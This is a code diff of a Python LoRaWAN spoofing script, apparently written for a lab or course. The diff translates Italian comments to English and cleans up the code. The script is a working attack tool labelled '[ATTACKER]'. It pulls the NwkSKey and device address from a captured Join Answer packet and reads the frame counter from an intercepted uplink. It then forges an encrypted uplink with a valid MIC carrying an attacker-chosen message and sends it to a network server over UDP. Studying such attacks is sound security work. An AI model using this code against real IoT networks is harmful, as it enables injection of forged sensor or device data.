@@ -2,21 +2,21 @@ import socket
 from Crypto.Hash import CMAC
 from Crypto.Cipher import AES
 
-
+# Computes a 4-byte MIC using AES-CMAC
 def generate_MIC(AESKey, payload):
     cmac_obj = CMAC.new(AESKey, ciphermod=AES)
     cmac_obj.update(payload)
-    MIC = cmac_obj.digest()[:4]  # Nel contesto LoRaWAN, il MIC è di 4 byte, quindi lo standard specifica di usare solo i primi 4 byte dei 16 generati dall'AES-CMAC
+    MIC = cmac_obj.digest()[:4]  # LoRaWAN uses only the first 4 bytes
     return MIC
 
+# Builds and sends an Unconfirmed Uplink packet using a given AppSKey and NwkSKey
 def uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, msg):
-    MHDR = b'\x40'
+    MHDR = b'\x40'  # Unconfirmed Data Up
     FCtrl = b'\x00'
-    FCnt += 1
-    FOpts = None
-    FHDR = DevAddr + FCtrl + FCnt.to_bytes(2, 'little')  # + FOpts
-    FPort = b'\x01'  # App Default
-    direction = 0
+    FCnt += 1  # Increment frame counter
+    FHDR = DevAddr + FCtrl + FCnt.to_bytes(2, 'little')
+    FPort = b'\x01'  # Application default port
+    direction = 0  # Uplink
 
     FRMPayload = encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, msg)
     MACPayload = FHDR + FPort + FRMPayload
@@ -26,18 +26,13 @@ def uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, msg):
     MIC = generate_MIC(NwkSKey, input_block)
 
     to_transmit_pkt = MHDR + MACPayload + MIC
-
-    sock.sendto(to_transmit_pkt, ("127.0.0.1", 9000))
+    sock.sendto(to_transmit_pkt, ("127.0.0.1", 9000))  # Send to Network Server
 
     return FCnt
 
-
+# Encrypts FRMPayload using AES in CTR-like mode (LoRaWAN-compliant)
 def encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, plaintext):
     text_in_bytes = plaintext.encode()
-
-    #print("CHIAVE ", AppSKey)
-    #print("TESTO IN BYTES ", text_in_bytes)
-
     aes = AES.new(AppSKey, AES.MODE_ECB)
     block_size = 16
     n_blocks = (len(text_in_bytes) + block_size - 1) // block_size
@@ -45,72 +40,61 @@ def encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, plaintext):
 
     for i in range(1, n_blocks + 1):
         Ai = (
-            b'\x01' +                      # Byte 0: sempre 0x01 (indica CTR-like mode)
-            b'\x00\x00\x00\x00' +          # Byte 1-4: sempre 0 (padding)
-            bytes([direction & 0xFF]) +    # Byte 5: uplink = 0, downlink = 1
-            DevAddr[::-1] +                # Byte 6-9: DevAddr in little endian
-            FCnt.to_bytes(4, 'little') +   # Byte 10-13: FCnt (contatore) in LE
-            b'\x00' +                      # Byte 14: padding
-            bytes([i])                     # Byte 15: numero del blocco
+            b'\x01' +                      # Block type = 0x01 for CTR-like
+            b'\x00\x00\x00\x00' +          # Padding
+            bytes([direction & 0xFF]) +    # Direction: 0 = uplink, 1 = downlink
+            DevAddr[::-1] +                # DevAddr (little-endian)
+            FCnt.to_bytes(4, 'little') +   # Frame counter
+            b'\x00' +                      # Reserved
+            bytes([i])                     # Block sequence number
         )
-
         Si = aes.encrypt(Ai)
         block = text_in_bytes[(i - 1)*block_size: i*block_size]
         encrypted += bytes(a ^ b for a, b in zip(block, Si))
 
-    #print("TESTO CRIPTATO", encrypted)
-
     return encrypted
 
+# Generates the B0 block for MIC computation
 def generate_block0(direction, DevAddr, FCnt, MACPayload):
     B0 = (
-            b'\x49' +  # 0: tipo MIC
-            b'\x00\x00\x00\x00' +  # 1–4: padding
-            bytes([direction & 0xFF]) +  # 5: 0 uplink, 1 downlink
-            DevAddr[::-1] +  # 6–9: DevAddr LE
-            FCnt.to_bytes(4, 'little') +  # 10–13: FCnt
-            b'\x00' +  # 14: padding
-            bytes([len(MACPayload)])  # 15: lunghezza messaggio
+        b'\x49' +                         # Block type = MIC
+        b'\x00\x00\x00\x00' +             # Padding
+        bytes([direction & 0xFF]) +       # Direction byte
+        DevAddr[::-1] +                   # DevAddr (little-endian)
+        FCnt.to_bytes(4, 'little') +      # Frame counter
+        b'\x00' +                         # Reserved
+        bytes([len(MACPayload)])          # MACPayload length
     )
-
     return B0
-
 
 ###################################################################################
 
-AppSKey = bytes.fromhex('62EF6DC0FA4FF9A0B73E358E9EF7A5C3') #AppSKey fasulla
+AppSKey = bytes.fromhex('62EF6DC0FA4FF9A0B73E358E9EF7A5C3')  # Arbitrary AppSKey for spoofing
 
 while True:
-
-    # Inserisci il pacchetto inviato dal JoinServer al NetServer (Join Answer) contenente la NwkSKey estrapolato da Wireshark (senza spazi)
+    # Get Join Accept packet directed to the NS captured from Wireshark (hex string without spaces)
     join_answer = input("Insert Join Answer packet from Wireshark: ")
-    # Inserisci il FRMPayload estrapolato da Wireshark (senza spazi)
-    uul_pkt = input("Insert FRMPayload from Wireshark: ")
+    # Get intercepted unconfirmed uplink packet (used to extract FCnt)
+    uul_pkt = input("Insert intercepted unconfirmed uplink packet from Wireshark: ")
 
-    # Converte la stringa esadecimale in bytes
     join_answer = bytes.fromhex(join_answer)
     uul_pkt = bytes.fromhex(uul_pkt)
 
-    # Visualizza i byte in formato lista
     print(f"[ATTACKER] Intercepted Join Answer: {list(join_answer)}")
     print(f"[ATTACKER] Intercepted UpLink Packet: {list(uul_pkt)}")
 
+    # Extract DevAddr and NwkSKey from the Join Answer
     DevAddr = join_answer[17:21]
     NwkSKey = join_answer[21:]
 
+    # Extract and parse FCnt from intercepted uplink
     FCnt = uul_pkt[6:8]
     FCnt = int.from_bytes(FCnt, 'little')
-    direction = 0
+    direction = 0  # Uplink
 
-
-    # creazione del pacchetto malevolo
+    # Compose and send a fake application-layer message
     mal_msg = input("Insert malevolent message:")
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    Fcnt= uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, mal_msg)
+    Fcnt = uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, mal_msg)
     print("[ATTACKER] Malevolent message forwarded to NS")
     print("-------------------------------------------------")
-
-
-
-
-
